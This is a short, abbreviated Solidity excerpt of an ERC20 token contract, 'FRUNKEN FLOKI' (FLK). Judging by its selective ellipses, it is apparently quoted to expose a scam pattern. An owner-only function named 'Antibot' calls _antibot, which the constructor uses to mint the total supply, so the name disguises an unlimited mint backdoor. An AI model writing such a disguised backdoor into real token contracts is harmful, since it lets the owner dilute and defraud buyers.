...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Antibot(uint256 amount) public onlyOwner {
    _antibot(msg.sender, amount);
    }
...
contract FRUNKYFLOKI is ERC20 {

    uint tokenTotalSupply = 100000000;

    constructor() public ERC20("FRUNKEN FLOKI", "FLK") {
        _antibot(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}